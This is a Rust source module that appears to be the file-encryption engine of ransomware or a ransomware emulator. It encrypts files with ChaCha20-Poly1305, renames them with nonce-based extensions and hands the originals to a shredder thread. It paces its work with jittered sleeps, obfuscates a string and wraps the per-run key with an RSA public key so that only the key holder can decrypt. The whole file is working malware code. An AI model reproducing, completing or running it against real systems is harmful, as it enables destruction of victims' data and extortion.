use crossbeam_channel::{Receiver, Sender};
use hex::{FromHex, encode};
use log::{debug, error, info, warn};
use purecrypto::{cipher::ChaCha20Poly1305, rsa::BoxedRsaPublicKey};
use rand::{
    RngExt, SeedableRng,
    rngs::{SmallRng, StdRng},
};
use std::{
    fs::{self, File, OpenOptions},
    io::{Error, Read, Write},
    path::PathBuf,
    sync::{
        Arc, LazyLock,
        atomic::{AtomicU64, Ordering},
    },
    thread, time,
};

use crate::config;

pub fn nonce_from_counter(counter: u64) -> [u8; 12] {
    let mut nonce = [0u8; 12];
    nonce[0..8].copy_from_slice(&counter.to_le_bytes());
    nonce
}

static ANALYSIS_FILENAME: LazyLock<String> = LazyLock::new(|| lc!("analysis.txt"));

pub fn encrypt(
    receiver: Receiver<Arc<PathBuf>>,
    sender: Sender<Arc<PathBuf>>,
    key: Arc<[u8; 32]>,
    counter: Arc<AtomicU64>,
    aad: Arc<[u8]>,
) -> thread::JoinHandle<()> {
    debug!("Starting encryption crypto thread");
    thread::spawn(move || {
        loop {
            let file_path = match receiver.recv() {
                Ok(path) => {
                    debug!("Received file path over channel: {path:?}");
                    path
                }
                Err(error) => {
                    warn!("Error receiving file path over channel: {error}");
                    return;
                }
            };

            let result = std::panic::catch_unwind({
                let file_path = file_path.clone();
                let key = Arc::clone(&key);
                let counter = Arc::clone(&counter);
                let aad = Arc::clone(&aad);
                let sender = sender.clone();
                let mut rng_cheap = SmallRng::from_rng(&mut rand::rng());
                debug!("Created cheap random number generator");
                move || {
                    info!("Encrypting file: {file_path:?}");

                    let nonce = counter.fetch_add(1, Ordering::Relaxed);
                    debug!("Nonce value after increment: {nonce:?}");

                    let full_nonce_bytes = nonce_from_counter(nonce);
                    debug!("Nonce value after padding: {full_nonce_bytes:?}");

                    let nonce_file_extension = format!(
                        "{}.{}",
                        encode(full_nonce_bytes),
                        config::ENCRYPTED_EXTENSION.as_str()
                    );
                    debug!("Nonce extension: {nonce_file_extension}");

                    let encrypted_file_path = {
                        let mut path = file_path.as_ref().clone();
                        let name = path
                            .file_name()
                            .map(|n| n.to_string_lossy().into_owned())
                            .unwrap_or_default();
                        path.set_file_name(format!("{name}.{nonce_file_extension}"));
                        path
                    };
                    debug!("Encrypted file path: {}", encrypted_file_path.display());

                    debug!(
                        "Applying ChaCha with source {}, destination {}, and nonce {:?} ",
                        file_path.as_ref().display(),
                        encrypted_file_path.display(),
                        full_nonce_bytes
                    );
                    match aead_encrypt_file(
                        file_path.as_ref(),
                        &encrypted_file_path,
                        &key,
                        &full_nonce_bytes,
                        &aad,
                    ) {
                        Ok(()) => {
                            debug!(
                                "Successfully applied ChaCha to data for encryption: {file_path:?}"
                            );
                            if let Err(error) = sender.send(file_path.clone()) {
                                error!("Failed to send path to shredder thread: {error}");
                            }
                        }
                        Err(error) => {
                            error!("Failed to apply ChaCha to data for encryption: {error:?}");
                        }
                    }

                    let wait_time = config::WAIT_TIME;
                    let jitter_time = config::JITTER_TIME;
                    if wait_time > 0 {
                        let time = wait_time - jitter_time + rng_cheap.random_range(0..jitter_time);
                        debug!("Sleeping {time} seconds before next encryption");
                        let time_duration = time::Duration::from_secs(u64::from(time));
                        thread::sleep(time_duration);
                        debug!("Sleeping complete");
                    }
                }
            });

            if result.is_err() {
                error!("Encryption thread recovered from panic on file: {file_path:?}");
            }
        }
    })
}

pub fn record(receiver: Receiver<Arc<PathBuf>>, path: Arc<PathBuf>) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let analysis_file_path = path.join(&*ANALYSIS_FILENAME);
        let mut analysis_file = match OpenOptions::new()
            .append(true)
            .create(true)
            .open(&analysis_file_path)
        {
            Ok(file) => file,
            Err(error) => {
                error!("Failed to open analysis file for recording: {error}");
                return;
            }
        };

        loop {
            let file_path = match receiver.recv() {
                Ok(path) => {
                    debug!("Received file path over channel: {path:?}");
                    path
                }
                Err(error) => {
                    warn!("Error receiving file path over channel: {error}");
                    return;
                }
            };

            if let Err(error) =
                analysis_file.write_all(format!("{}\n", file_path.to_string_lossy()).as_bytes())
            {
                error!("Failed to write to analysis file: {error}");
            }
        }
    })
}

pub fn decrypt(
    receiver: Receiver<Arc<PathBuf>>,
    key: Arc<[u8; 32]>,
    aad: Arc<[u8]>,
) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        loop {
            let file_path = match receiver.recv() {
                Ok(path) => {
                    debug!("Received file path over channel: {path:?}");
                    path
                }
                Err(error) => {
                    warn!("Error receiving file path over channel: {error}");
                    return;
                }
            };

            info!("Decrypting file: {}", file_path.display());

            let file_name_osstr = if let Some(os_str) = file_path.file_name() {
                debug!("Successfully got file name from path: {}", os_str.display());
                os_str
            } else {
                error!("File path has invalid file name: {file_path:?}");
                continue;
            };

            let file_name = if let Some(name) = file_name_osstr.to_str() {
                debug!("Successfully converted file name to string: {name}");
                name
            } else {
                error!(
                    "File name is not valid UTF-8: {}",
                    file_name_osstr.display()
                );
                continue;
            };

            let file_extensions: Vec<&str> = file_name.split('.').collect();
            let file_extensions_count = file_extensions.len();
            if file_extensions_count < 2 {
                error!("File lacks the number of extensions to decrypt: {file_extensions_count}");
                continue;
            }

            let nonce_str = if let Some(segment) = file_extensions.get(file_extensions_count - 2) {
                debug!("Successfully got nonce file extension: {segment}");
                segment
            } else {
                error!("Cannot get nonce extension: {file_extensions:?}");
                continue;
            };

            let full_nonce_bytes = match <[u8; 12]>::from_hex(nonce_str) {
                Ok(nonce_bytes) => {
                    debug!("Extension hex decoded: {nonce_bytes:?}");
                    nonce_bytes
                }
                Err(error) => {
                    error!("Extension hex could not be decoded: {error:?}");
                    continue;
                }
            };

            let parent_dir = if let Some(parent) = file_path.parent() {
                debug!("Successfully got parent path of file path: {file_path:?}");
                parent
            } else {
                error!("File path has invalid parent path: {file_path:?}");
                continue;
            };

            let decrypted_file_name = file_extensions[..file_extensions_count - 2].join(".");
            debug!("Decrypted file name: {decrypted_file_name}");
            let decrypted_file_path = parent_dir.join(decrypted_file_name);
            debug!("Decrypted file path: {}", decrypted_file_path.display());

            match aead_decrypt_file(
                file_path.as_ref(),
                &decrypted_file_path,
                &key,
                &full_nonce_bytes,
                &aad,
            ) {
                Ok(()) => {
                    debug!("Successfully applied ChaCha to data for decryption: {file_path:?}");
                }
                Err(error) => {
                    error!("Failed to apply ChaCha to data for decryption: {error:?}");
                }
            }
        }
    })
}

fn aead_encrypt_file(
    source_file_path: &PathBuf,
    destination_file_path: &PathBuf,
    key: &[u8; 32],
    full_nonce_bytes: &[u8; 12],
    aad: &[u8],
) -> Result<(), Error> {
    let result = (|| -> Result<(), Error> {
        let aead = ChaCha20Poly1305::new(key);
        let mut source = File::open(source_file_path)?;
        let mut dest = File::create(destination_file_path)?;
        let mut data = Vec::new();
        source.read_to_end(&mut data)?;
        let tag = aead.encrypt(full_nonce_bytes, aad, &mut data);
        dest.write_all(&data)?;
        dest.write_all(&tag)?;
        dest.sync_all()?;
        Ok(())
    })();
    if result.is_err() {
        let _ = fs::remove_file(destination_file_path);
    }
    result
}

fn aead_decrypt_file(
    source_file_path: &PathBuf,
    destination_file_path: &PathBuf,
    key: &[u8; 32],
    full_nonce_bytes: &[u8; 12],
    aad: &[u8],
) -> Result<(), Error> {
    let aead = ChaCha20Poly1305::new(key);
    let mut source = File::open(source_file_path)?;
    let mut dest = File::create(destination_file_path)?;
    let mut data = Vec::new();
    source.read_to_end(&mut data)?;
    if data.len() < 16 {
        return Err(Error::other("Encrypted file shorter than Poly1305 tag"));
    }
    let cipher_len = data.len() - 16;
    let mut tag = [0u8; 16];
    tag.copy_from_slice(&data[cipher_len..]);
    data.truncate(cipher_len);
    aead.decrypt(full_nonce_bytes, aad, &mut data, &tag)
        .map_err(|_| Error::other("ChaCha20-Poly1305 authentication failed"))?;
    dest.write_all(&data)?;
    dest.sync_all()?;
    Ok(())
}

pub fn encrypt_string(
    source: &str,
    key: &[u8; 32],
    full_nonce_bytes: &[u8; 12],
    aad: &[u8],
) -> (Vec<u8>, [u8; 16]) {
    debug!("Encrypting string: {source}");
    let mut source_data = source.as_bytes().to_vec();
    debug!("String bytes: {source_data:?}");
    let tag = ChaCha20Poly1305::new(key).encrypt(full_nonce_bytes, aad, &mut source_data);
    debug!(
        "String encrypted ({} bytes, tag {:?})",
        source_data.len(),
        tag
    );
    (source_data, tag)
}

pub fn decrypt_string(
    ciphertext: &[u8],
    key: &[u8; 32],
    full_nonce_bytes: &[u8; 12],
    tag: &[u8; 16],
    aad: &[u8],
) -> Option<String> {
    debug!("Decrypting string: {ciphertext:?}");
    let mut source_data = ciphertext.to_vec();
    ChaCha20Poly1305::new(key)
        .decrypt(full_nonce_bytes, aad, &mut source_data, tag)
        .ok()?;
    debug!("String bytes: {source_data:?}");
    match String::from_utf8(source_data) {
        Ok(string) => {
            debug!("Successfully decoded bytes to string: {string}");
            Some(string)
        }
        Err(error) => {
            error!("Failed to decode bytes to string: {error}");
            None
        }
    }
}

pub fn generate_sym_key(sym_key: &mut [u8; 32]) {
    debug!("Starting key generation");
    let mut rng = StdRng::from_rng(&mut rand::rng());
    rng.fill(sym_key);
    debug!("Generated symmetric key");
}

pub fn encrypt_sym_key(
    asym_pub_key: &BoxedRsaPublicKey,
    sym_key: &[u8; 32],
) -> Result<Vec<u8>, String> {
    use purecrypto::rng::OsRng;
    let mut rng = OsRng;
    asym_pub_key
        .encrypt_pkcs1v15(sym_key, &mut rng)
        .map_err(|e| format!("Failed to encrypt symmetric key: {e}"))
}
